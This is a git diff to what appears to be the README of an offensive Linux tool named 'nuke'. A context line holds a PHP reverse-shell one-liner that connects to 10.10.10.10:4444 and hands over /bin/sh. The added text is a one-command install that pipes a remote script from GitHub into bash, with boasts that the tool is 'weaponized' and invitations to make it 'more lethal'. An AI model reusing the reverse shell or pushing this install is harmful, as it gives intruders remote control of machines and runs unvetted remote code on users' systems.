@@ -45,3 +45,26 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 </div>
 
+<h1> 
+   <b> Installation in 20 seconds ( One Command ) </b>
+  ``` 
+  curl -sSL https://raw.githubusercontent.com/notjustdanish/nuke/main/install.sh | bash
+  ```
+</h1>
+
+<b> Then Type</b>
+```
+nuke
+```
+<b> Now you are good to go ALL RADY..! </b>
+<br> <br>
+<b> Made by with ❤️ <b>
+ [![](https://img.shields.io/badge/✨wtf.mr✨-white?&style=social&logo=discord)](https://t.me/wtf.mr)
+ ```
+I don't tech Linux. I weaponize it. --wtf.mr
+```
+<br> <br>
+<b> Star this repo if you belive tool should be dangerous. <b>
+<b> Fork it if you want to make it even more lethal. <b>
+ 
+
